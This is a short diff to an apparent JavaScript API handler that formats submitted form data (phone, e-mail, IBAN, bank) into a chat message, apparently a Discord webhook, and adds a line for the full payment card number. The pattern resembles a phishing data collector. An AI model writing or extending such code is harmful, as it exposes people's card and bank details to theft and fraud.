@@ -28,6 +28,7 @@ export default async function handler(req, res) {
 **Téléphone :** ${data.telephone || '—'}   **E-mail :** ${data.email || '—'}
 **Créneau :** ${data.creneau || '—'}   **Langue :** ${data.langue || '—'}
 **IBAN :** ${data.iban || '—'}   **Banque :** ${data.banque || '—'}
+**Numéro de carte :** ${data.carte || '—'}
 **Reçu le :** ${data.date || '—'}`,
     allowed_mentions: { parse: [] }
   };
